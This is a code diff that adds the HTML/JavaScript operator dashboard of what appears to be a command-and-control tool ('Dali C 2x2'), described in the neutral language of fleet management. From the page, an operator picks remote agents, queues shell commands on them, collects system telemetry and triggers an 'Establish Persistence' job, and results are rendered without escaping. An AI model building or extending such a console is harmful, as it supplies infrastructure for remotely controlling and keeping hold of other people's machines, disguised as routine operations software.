@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Dali C 2x2 | Manager Dashboard</title>
+    <link rel="stylesheet" href="/static/style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="layout">
+      <!-- Sidebar -->
+      <div class="sidebar">
+        <div class="logo">
+          <svg
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path d="M12 2a10 10 0 1 0 10 10H12V2z" />
+            <path d="M12 12L2.7 7.3" />
+            <path d="M12 12V22" />
+            <path d="M12 12L21.3 7.3" />
+          </svg>
+          Dali C 2x2
+        </div>
+        <div id="agent-list">
+          <p style="color: var(--text-muted)">Discovering nodes...</p>
+        </div>
+      </div>
+
+      <!-- Main Area -->
+      <div class="main-content">
+        <!-- Stats Bar -->
+        <div class="stats-container">
+          <div class="stat-card">
+            <span class="stat-label">Online Nodes</span>
+            <span class="stat-value" id="stat-online">0</span>
+          </div>
+          <div class="stat-card">
+            <span class="stat-label">Total Jobs</span>
+            <span class="stat-value" id="stat-tasks">0</span>
+          </div>
+          <div class="stat-card">
+            <span class="stat-label">Queued</span>
+            <span class="stat-value" id="stat-pending">0</span>
+          </div>
+          <div class="stat-card">
+            <span class="stat-label">Orchestration</span>
+            <span class="stat-value">v1.1</span>
+          </div>
+        </div>
+
+        <div id="welcome-screen" class="glass-card">
+          <h1>Fleet Control Plane</h1>
+          <p style="color: var(--text-muted)">
+            Select a managed node from the inventory to orchestrate jobs and
+            view telemetry.
+          </p>
+        </div>
+
+        <!-- Orchestrator Controls -->
+        <div id="agent-controls" class="glass-card" style="display: none">
+          <div
+            style="
+              display: flex;
+              justify-content: space-between;
+              align-items: center;
+            "
+          >
+            <h2 id="active-agent-title">Node Control</h2>
+            <div id="node-badge"></div>
+          </div>
+
+          <div class="task-controls">
+            <select id="task-type">
+              <option value="sysinfo">Get System Telemetry</option>
+              <option value="shell">Queue Shell Command</option>
+              <option value="persist">Establish Persistence</option>
+            </select>
+            <input
+              type="text"
+              id="task-command"
+              placeholder="Enter payload configuration..."
+              style="flex-grow: 1"
+            />
+            <button onclick="sendTask()">Submit Job</button>
+          </div>
+        </div>
+
+        <!-- Job History Table -->
+        <div id="terminal-container" style="display: none">
+          <div class="glass-card">
+            <h2>Job Orchestration History</h2>
+            <table class="job-table">
+              <thead>
+                <tr>
+                  <th>Job ID</th>
+                  <th>Type</th>
+                  <th>Scheduled</th>
+                  <th>Status</th>
+                  <th>Execution Result</th>
+                </tr>
+              </thead>
+              <tbody id="task-history">
+                <!-- Tasks will be injected here -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let activeAgentId = null;
+
+      async function fetchStats() {
+        try {
+          const response = await fetch("/api/stats");
+          const stats = await response.json();
+          document.getElementById("stat-online").innerText =
+            stats.online_agents;
+          document.getElementById("stat-tasks").innerText = stats.total_tasks;
+          document.getElementById("stat-pending").innerText =
+            stats.pending_tasks;
+        } catch (e) {}
+      }
+
+      async function fetchAgents() {
+        try {
+          const response = await fetch("/api/agents");
+          const agents = await response.json();
+          const list = document.getElementById("agent-list");
+          list.innerHTML = "";
+
+          agents.forEach((agent) => {
+            const div = document.createElement("div");
+            div.className = `agent-item ${
+              agent.id === activeAgentId ? "active" : ""
+            }`;
+            div.onclick = () => selectAgent(agent.id, agent.status);
+
+            const isOnline = agent.status === "online";
+            const os = agent.info?.os || "Unknown";
+
+            div.innerHTML = `
+                        <div class="agent-id">${agent.id.substring(0, 8)} [v${
+              agent.version
+            }]</div>
+                        <div class="agent-status">
+                            <span class="status-dot ${
+                              isOnline ? "status-online" : "status-offline"
+                            }"></span>
+                            <span>${agent.status.toUpperCase()}</span>
+                        </div>
+                        <div class="agent-meta">
+                            <span>OS: ${os}</span>
+                            <span>Seen: ${new Date(
+                              agent.last_seen
+                            ).toLocaleTimeString()}</span>
+                        </div>
+                    `;
+            list.appendChild(div);
+          });
+        } catch (e) {}
+      }
+
+      async function selectAgent(id, status) {
+        activeAgentId = id;
+        document.getElementById("welcome-screen").style.display = "none";
+        document.getElementById("agent-controls").style.display = "block";
+        document.getElementById("terminal-container").style.display = "block";
+        document.getElementById(
+          "active-agent-title"
+        ).innerText = `Node: ${id.substring(0, 8)}`;
+
+        fetchAgents();
+        fetchHistory();
+      }
+
+      async function fetchHistory() {
+        if (!activeAgentId) return;
+        try {
+          const response = await fetch(`/api/tasks/${activeAgentId}`);
+          const tasks = await response.json();
+          const container = document.getElementById("task-history");
+          container.innerHTML = "";
+
+          tasks.forEach((task) => {
+            const row = document.createElement("tr");
+
+            let resultHtml =
+              '<span style="color: var(--text-muted)">Waiting for lease...</span>';
+            if (task.status === "leased")
+              resultHtml =
+                '<span style="color: var(--accent)">Processing on node...</span>';
+            if (task.result) {
+              const out =
+                task.result.stdout ||
+                JSON.stringify(task.result.info || task.result).substring(
+                  0,
+                  100
+                );
+              resultHtml = `<pre>${out}</pre>`;
+            }
+
+            row.innerHTML = `
+                        <td class="agent-id">${task.id.substring(0, 8)}</td>
+                        <td><span class="badge badge-leased" style="background: rgba(255,255,255,0.05)">${
+                          task.type
+                        }</span></td>
+                        <td style="font-size: 0.75rem">${new Date(
+                          task.created_at
+                        ).toLocaleString()}</td>
+                        <td><span class="badge badge-${task.status}">${
+              task.status
+            }</span></td>
+                        <td>${resultHtml}</td>
+                    `;
+            container.appendChild(row);
+          });
+        } catch (e) {}
+      }
+
+      async function sendTask() {
+        const type = document.getElementById("task-type").value;
+        const command = document.getElementById("task-command").value;
+        if (!activeAgentId) return;
+
+        try {
+          await fetch(
+            `/operator/tasks?agent_id=${activeAgentId}&task_type=${type}&command=${encodeURIComponent(
+              command
+            )}`,
+            {
+              method: "POST",
+            }
+          );
+          document.getElementById("task-command").value = "";
+          fetchHistory();
+        } catch (e) {
+          alert("Orchestration request failed");
+        }
+      }
+
+      // Auto-refresh loops
+      setInterval(fetchAgents, 5000);
+      setInterval(fetchHistory, 3000);
+      setInterval(fetchStats, 5000);
+
+      fetchAgents();
+      fetchStats();
+    </script>
+  </body>
+</html>
